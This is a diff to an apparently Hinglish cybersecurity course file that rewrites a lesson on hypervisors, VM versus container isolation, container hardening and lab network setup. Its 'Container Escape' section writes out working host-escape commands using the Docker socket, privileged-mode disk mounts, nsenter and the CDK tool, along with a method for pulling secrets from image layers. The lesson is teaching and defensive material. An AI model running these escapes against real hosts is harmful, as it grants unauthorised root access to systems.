@@ -7564,33 +7564,382 @@ ollama run mistral "Analyze this for vulnerabilities: SELECT * FROM users WHERE 
   // ─── PHASE 1 REMAINING ──────────────────────────────────────────────────────
 
   "cb-07": {
-    title: "Virtualization & Containers",
+    title: "Virtualization & Container Security",
     image: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=900&fit=crop&auto=format",
-    tagline: "VirtualBox, VMware, Docker — hacker ka best friend! Lab setup karo bina kuch toде!",
+    tagline: "Type 1 vs Type 2 hypervisors, Docker socket escape, container hardening — virtual environments ka security angle",
     sections: [
       {
-        heading: "🖥️ Virtualization Kya Hai?",
-        content: `Virtualization ka matlab hai — ek physical computer ke andar kai virtual computers chalana. Har virtual machine (VM) ko lagta hai woh alag computer hai, lekin actually sab ek hi hardware share kar rahe hain.\n\n**Kyun zaroori hai hackers ke liye:**\n• Malware analyze karo — asli system safe rahega\n• Alag alag OS test karo (Kali, Windows, Ubuntu)\n• Network simulate karo multiple VMs se\n• Snapshot lena — galti ho toh ek click mein wapas jao\n\n**Popular Virtualization Software:**\n• **VirtualBox** — Free, open source, Windows/Mac/Linux pe chalata hai\n• **VMware Workstation** — Professional, zyada features (paid)\n• **VMware Fusion** — Mac ke liye\n• **Hyper-V** — Windows ka built-in (Pro/Enterprise)`,
+        heading: "🖥️ Hypervisors — Type 1 vs Type 2",
+        content: `Virtualization ek physical machine pe multiple virtual machines chalane ki technology hai. Hypervisor voh software hai jo yeh manage karta hai. Cybersecurity ke liye inhe samajhna zaroori hai — cloud attacks, VM escape, lab setup sab iske baad samajh aata hai.
+
+**Type 1 — Bare-Metal Hypervisor:**
+\`\`\`
+Physical Hardware
+     ↓
+Type 1 Hypervisor (directly on hardware)
+     ↓
+VM1 | VM2 | VM3 | VM4
+
+Examples:
+- VMware ESXi/vSphere (enterprise standard)
+- Microsoft Hyper-V (Windows Server)
+- Xen (open source, AWS ka base tha)
+- KVM (Linux kernel built-in, GCP/OpenStack)
+- Citrix XenServer
+
+Characteristics:
+✓ No host OS — hypervisor IS the OS
+✓ Faster, more efficient (no OS overhead)
+✓ Smaller attack surface (no extra OS to patch)
+✓ Enterprise use: data centers, cloud providers
+✗ More complex setup
+\`\`\`
+
+**Type 2 — Hosted Hypervisor:**
+\`\`\`
+Physical Hardware
+     ↓
+Host OS (Windows/macOS/Linux)
+     ↓
+Type 2 Hypervisor (application ki tarah)
+     ↓
+VM1 | VM2 | VM3
+
+Examples:
+- VirtualBox (free, open source — lab ke liye best)
+- VMware Workstation/Fusion (paid, professional)
+- Parallels Desktop (Mac ke liye)
+- QEMU/KVM (Linux, also used as Type 1 with KVM)
+
+Characteristics:
+✓ Easy install on any computer
+✓ Personal/lab use ke liye perfect
+✓ Host OS features use kar sakta hai (USB, printers, clipboard)
+✗ Performance overhead (two OS layers)
+✗ Security: host OS compromise → hypervisor aur VMs risk mein
+\`\`\`
+
+**Security Comparison:**
+\`\`\`
+Attack scenario on Type 2:
+Attacker compromises Windows Host OS
+→ Access to hypervisor process
+→ Potential VM guest-to-host escape
+→ All VMs at risk
+
+Type 1 mein:
+No host OS = no extra attack surface
+Attacker ko hypervisor directly target karna padega (much harder)
+Enterprise security: Type 1 preferred
+
+VM Escape attacks (rare but real):
+- CVE-2019-0841: Hyper-V escape
+- CVE-2018-3646: L1 Terminal Fault (Intel speculative execution)
+- VENOM (2015): QEMU floppy controller buffer overflow
+\`\`\``,
       },
       {
-        heading: "🐳 Docker — Containers Ka Concept",
-        content: `Docker VM se alag hai — zyada lightweight:\n\n**VM vs Container:**\n| VM | Container |\n|----|-----------|\n| Full OS andar | Sirf app + dependencies |\n| GBs of space | MBs of space |\n| Minutes to start | Seconds to start |\n| Strong isolation | Process-level isolation |\n\n**Docker basic commands:**\n\`\`\`bash\ndocker pull kalilinux/kali-rolling  # Image download\ndocker run -it ubuntu bash           # Container start (interactive)\ndocker ps                            # Running containers\ndocker ps -a                         # Sab containers\ndocker stop CONTAINER_ID             # Stop\ndocker rm CONTAINER_ID               # Remove\n\`\`\`\n\n**Docker cybersecurity use:**\n• Vulnerable apps run karo (DVWA, WebGoat)\n• Isolated malware sandbox\n• CTF challenges\n• Tool testing`,
+        heading: "🐳 VM vs Container — Isolation Level",
+        content: `VM aur containers dono virtualization ke forms hain, lekin fundamentally different tarike se kaam karte hain. Security posture bilkul alag hai.
+
+**Virtual Machine — Full OS Isolation:**
+\`\`\`
+Physical Hardware
+     ↓
+Hypervisor
+     ↓
+[VM1: Kernel1 + OS1 + App] | [VM2: Kernel2 + OS2 + App]
+
+Isolation mechanism:
+- Har VM ka apna kernel
+- Apna OS boot hota hai
+- Hardware virtual kiya jaata hai (virtual CPU, RAM, disk, NIC)
+- Memory completely separate
+
+Security: VM escape = kernel vulnerability exploit karni padti hai
+Realistic threat: Very rare, requires sophisticated exploit
+\`\`\`
+
+**Container — Process Isolation:**
+\`\`\`
+Physical Hardware
+     ↓
+Host OS Kernel (SHARED!)
+     ↓
+Container Runtime (Docker, containerd, CRI-O)
+     ↓
+[Container1: App1] | [Container2: App2] | [Container3: App3]
+
+Isolation mechanism:
+- Linux Namespaces: PID, Network, Mount, IPC, UTS, User
+- cgroups: CPU, memory, I/O limits
+- Seccomp: syscall filtering
+- AppArmor/SELinux: MAC policies
+
+Key insight: Same kernel! Container se escape → host kernel attack
+\`\`\`
+
+**Practical Comparison Table:**
+
+| Feature | VM | Container |
+|---------|-----|-----------|
+| Startup time | Minutes | Seconds |
+| Disk size | GBs (full OS) | MBs (app only) |
+| Memory | 1-4 GB | 50-200 MB |
+| Isolation | Strong (kernel boundary) | Weaker (same kernel) |
+| Performance | ~5-10% overhead | ~1-2% overhead |
+| Attack surface | Large (full OS) | Smaller (minimal) |
+| Escape difficulty | Very hard | Easier (misconfiguration) |
+| Use case | Untrusted workloads | Trusted, containerized apps |
+
+**When to Use Which:**
+\`\`\`
+Use VM when:
+- Untrusted code/malware analysis
+- Different OS needed (Windows on Linux host)
+- Strong security isolation required
+- Multi-tenant (different customers, different VMs)
+
+Use Container when:
+- Microservices architecture
+- CI/CD pipelines
+- Rapid deployment, scaling
+- Trusted workloads, same team
+- Development environment consistency
+\`\`\``,
       },
       {
-        heading: "🔒 Container Security Risks",
-        content: `Containers secure nahi hote by default:\n\n**Common risks:**\n• **Privileged containers** — Host ke resources access\n• **Image vulnerabilities** — Purani libraries with CVEs\n• **Container escape** — VM se bahar niklna\n• **Exposed Docker socket** — /var/run/docker.sock access = root!\n\n**Docker escape example (CTF common):**\n\`\`\`bash\n# Agar docker.sock mount hai container mein:\nls -la /var/run/docker.sock  # Check karo\n\n# Toh host pe docker commands chal sakte hain!\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# Ab host ka full root access!\n\`\`\`\n\n**Defense:**\n• Non-root user se containers chalao\n• Read-only filesystems\n• Capabilities drop karo\n• Docker socket never mount karo production mein\n• Regular image updates`,
+        heading: "🚨 Container Escape — Attack Techniques",
+        content: `Container escape = container ke andar se host system tak access milna. Yeh multiple misconfigurations se possible hota hai. Lab mein samjho — production mein defend karo.
+
+**Attack 1 — Docker Socket Mount (Most Common):**
+\`\`\`bash
+# Check: Container mein docker socket hai?
+ls -la /var/run/docker.sock 2>/dev/null && echo "VULNERABLE!"
+
+# Agar hai, container se escape:
+docker run -v /:/host --rm -it alpine chroot /host sh
+# Alternative:
+docker run -it -v /:/host alpine /bin/sh -c "chroot /host bash"
+# Result: Host filesystem ka complete root access!
+
+# Why? Docker socket = Unix socket to control Docker daemon
+# Container ke andar socket → Docker daemon commands → host pe privileged container → escape
+\`\`\`
+
+**Attack 2 — Privileged Mode:**
+\`\`\`bash
+# Check if running in privileged mode:
+cat /proc/self/status | grep CapEff
+# CapEff: 0000003fffffffff  ← ALL capabilities = likely privileged
+
+# Alternative check:
+amicontained 2>/dev/null   # Tool jo container capabilities check karta hai
+
+# Escape via disk mount:
+fdisk -l 2>/dev/null    # Host disks list
+mkdir /tmp/host_mount
+mount /dev/sda1 /tmp/host_mount    # Host disk mount karo
+chroot /tmp/host_mount /bin/bash   # Escape!
+\`\`\`
+
+**Attack 3 — Dangerous Capabilities:**
+\`\`\`bash
+# CAP_SYS_ADMIN — almost root:
+nsenter --mount=/proc/1/ns/mnt -- /bin/bash
+# Mounts host filesystem
+
+# CAP_NET_ADMIN — network attacks:
+# ARP spoofing, sniffing, routing manipulation on host network
+
+# Check all capabilities:
+capsh --print 2>/dev/null
+cat /proc/self/status | grep Cap
+
+# CDK tool — automatic escape scanner:
+./cdk run mount-docker-sock   # Automatic exploit docker socket
+./cdk evaluate                # Evaluate all possible escapes
+\`\`\`
+
+**Attack 4 — Image Layer Secrets:**
+\`\`\`bash
+# Docker image history — kya secrets commit huye hain?
+docker history imagename --no-trunc
+
+# Image layers extract karo:
+docker save imagename | tar xv
+# Har layer ek tar file hai — secret.key delete hone ke baad bhi andar hai!
+
+# Dockerfile mein common mistake:
+# FROM ubuntu
+# RUN echo "DB_PASS=secret123" > /tmp/config.env  # Layer 1 mein!
+# RUN rm /tmp/config.env   # Layer 2 mein delete kiya
+# 'docker history' se Layer 1 accessible hai!
+\`\`\``,
       },
       {
-        heading: "🧪 Lab Setup — Vulnerable Apps",
-        content: `Ethical hacking practice ke liye vulnerable apps Docker mein chalao:\n\n**DVWA (Damn Vulnerable Web App):**\n\`\`\`bash\ndocker run -d -p 8080:80 vulnerables/web-dvwa\n# Browser: http://localhost:8080\n# Login: admin/password\n\`\`\`\n\n**WebGoat (OWASP):**\n\`\`\`bash\ndocker run -d -p 8888:8888 webgoat/goat-and-wolf\n# Browser: http://localhost:8888/WebGoat\n\`\`\`\n\n**Metasploitable 2:**\n\`\`\`bash\n# VirtualBox mein import karo (OVA file)\n# Download: sourceforge.net/projects/metasploitable\n# Deliberately vulnerable Linux VM\n\`\`\`\n\n**Vulhub — Ready-made vulnerable environments:**\n\`\`\`bash\ngit clone https://github.com/vulhub/vulhub\ncd vulhub/struts2/s2-045\ndocker-compose up -d\n# CVE-2017-5638 practice!\n\`\`\``,
+        heading: "🛡️ Container Hardening — Defense",
+        content: `Container escape se bachne ke liye production deployments mein yeh practices follow karo.
+
+**Docker Run Security Flags:**
+\`\`\`bash
+# INSECURE (default):
+docker run -it ubuntu bash
+
+# SECURE — minimal permissions:
+docker run \
+  --user 1000:1000 \           # Non-root user
+  --read-only \                # Read-only root filesystem
+  --no-new-privileges \        # Privilege escalation prevent
+  --cap-drop ALL \             # Sab capabilities hata do
+  --cap-add NET_BIND_SERVICE \ # Sirf jo chahiye woh add karo
+  --security-opt no-new-privileges \
+  --security-opt seccomp=/path/to/seccomp.json \  # Seccomp profile
+  --tmpfs /tmp \               # Writable temp directory
+  -p 127.0.0.1:8080:80 \      # Sirf localhost pe bind
+  myapp:latest
+\`\`\`
+
+**Dockerfile Best Practices:**
+\`\`\`dockerfile
+# CORRECT — Multi-stage build:
+# Stage 1: Build
+FROM node:18 AS builder
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production
+
+# Stage 2: Runtime (minimal)
+FROM node:18-alpine AS runtime
+# Alpine = minimal OS, smaller attack surface
+
+RUN addgroup -S appgroup && adduser -S appuser -G appgroup
+USER appuser  # Non-root user!
+
+WORKDIR /app
+COPY --from=builder /app/node_modules ./node_modules
+COPY --from=builder /app/src ./src
+
+EXPOSE 3000
+CMD ["node", "src/index.js"]
+# Secrets yahan nahi hain — runtime pe inject karo (env vars)
+\`\`\`
+
+**Docker Compose Security:**
+\`\`\`yaml
+version: '3.8'
+services:
+  webapp:
+    image: myapp:latest
+    user: "1000:1000"           # Non-root
+    read_only: true             # Read-only filesystem
+    tmpfs:
+      - /tmp                    # Writable temp
+    security_opt:
+      - no-new-privileges:true
+    cap_drop:
+      - ALL
+    cap_add:
+      - NET_BIND_SERVICE        # Sirf zaroorat pe
+    environment:
+      - SECRET_KEY              # Runtime env (from .env file)
+    # NEVER:
+    # privileged: true
+    # volumes:
+    #   - /var/run/docker.sock:/var/run/docker.sock
+\`\`\`
+
+**Docker Bench Security:**
+\`\`\`bash
+# CIS Docker Benchmark automated check:
+docker run --net host --pid host --userns host --cap-add audit_control \
+  -v /etc:/etc:ro \
+  -v /var/run/docker.sock:/var/run/docker.sock:ro \
+  --label docker_bench_security \
+  docker/docker-bench-security
+
+# Common findings:
+# WARN: Docker daemon running as root
+# WARN: Container running as root
+# WARN: Docker socket exposed in container
+\`\`\``,
+      },
+      {
+        heading: "🔀 VM Network Modes — Lab Security",
+        content: `Lab setup mein network mode chuna ek crucial security decision hai — galat mode = vulnerable VMs internet pe exposed.
+
+**Three Main Network Modes:**
+\`\`\`
+NAT (Network Address Translation):
+  VM real IP: 10.0.2.15 (VirtualBox internal)
+  Internet access: Yes (through host)
+  Incoming connections: Blocked by default
+  Security: Moderate — VM internet pe invisible
+
+Bridged Adapter:
+  VM real IP: Real network se DHCP (e.g., 192.168.1.105)
+  Internet access: Yes, directly
+  Network pe visible: YES — jaise ek real machine
+  Security: DANGEROUS for vulnerable VMs!
+  Bots minutes mein Metasploitable ko exploit kar lenge!
+
+Host-Only:
+  VM IP: 192.168.56.0/24 range
+  Internet access: NO
+  Host se access: Yes
+  VM to VM (same network): Yes
+  Security: BEST for hacking labs
+\`\`\`
+
+**Hacking Lab Setup — Recommended Architecture:**
+\`\`\`
+Host Machine (Windows/macOS/Linux)
+     │
+     ├── Kali Linux VM
+     │   ├── Network Adapter 1: NAT (internet access for tools)
+     │   └── Network Adapter 2: Host-Only (192.168.56.101)
+     │
+     └── Metasploitable 2 VM (target)
+         └── Network Adapter 1: Host-Only ONLY (192.168.56.102)
+                      NO NAT! NO BRIDGED!
+
+Commands:
+nmap -sV 192.168.56.102   # Metasploitable scan
+msfconsole → use exploit/... → set RHOSTS 192.168.56.102
+\`\`\`
+
+**Snapshot — Malware Analyst Workflow:**
+\`\`\`
+Step 1: Windows 10 VM setup (minimal, no AV for dynamic analysis)
+Step 2: Monitoring tools install:
+  - Process Monitor (ProcMon) — file/registry/network events
+  - Process Hacker — processes, network connections
+  - Regshot — registry diff (before/after)
+  - Wireshark — network capture
+  - FakeNet-NG — fake DNS/HTTP server for C2 simulation
+Step 3: Network = Host-Only (no real internet for malware C2)
+Step 4: SNAPSHOT → "Clean Baseline"
+
+Workflow:
+→ Malware execute karo
+→ ProcMon, Regshot, Wireshark capture
+→ Document: C2 IPs, registry changes, dropped files
+→ REVERT snapshot (30 seconds — clean again!)
+→ Next sample repeat
+
+Online sandboxes (no setup): any.run, hybrid-analysis.com, joe sandbox
+\`\`\``,
       },
     ],
     keyPoints: [
-      "VM = full OS virtualization; Container = sirf app + dependencies",
-      "VirtualBox free hai — Kali Linux VM banana best practice",
-      "Docker: seconds mein vulnerable apps setup karo",
-      "Docker socket access = root escape — kabhi production mein mount nahi",
-      "Snapshot lena = galti recover karne ka fastest tarika",
+      "Type 1 hypervisor: hardware pe directly (ESXi, KVM) — no host OS, enterprise; Type 2: host OS pe app (VirtualBox) — labs",
+      "VM: apna kernel (strong isolation); Container: shared kernel (weaker — misconfiguration se escape possible)",
+      "Docker socket (/var/run/docker.sock) container mein = immediate host root access — kabhi mount mat karo",
+      "Privileged container (--privileged) = almost full host access — fdisk se disk mount kar ke escape",
+      "Lab network: Metasploitable = Host-Only ONLY; Kali = Host-Only + NAT — vulnerable VMs internet pe nahi",
+      "Container hardening: --user nonroot, --read-only, --cap-drop ALL, --no-new-privileges, seccomp profile",
+      "Multi-stage Docker builds: secrets build mein nahi, runtime pe inject karo (env vars, Vault)",
+      "VM snapshot workflow: clean baseline → malware run → monitor → revert (30 sec) → repeat",
     ],
     labs: [
       {
@@ -7620,7 +7969,6 @@ ollama run mistral "Analyze this for vulnerabilities: SELECT * FROM users WHERE 
       },
     ],
   },
-
   "cb-08": {
     title: "Hacking Lab Setup",
     image: "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=900&fit=crop&auto=format",
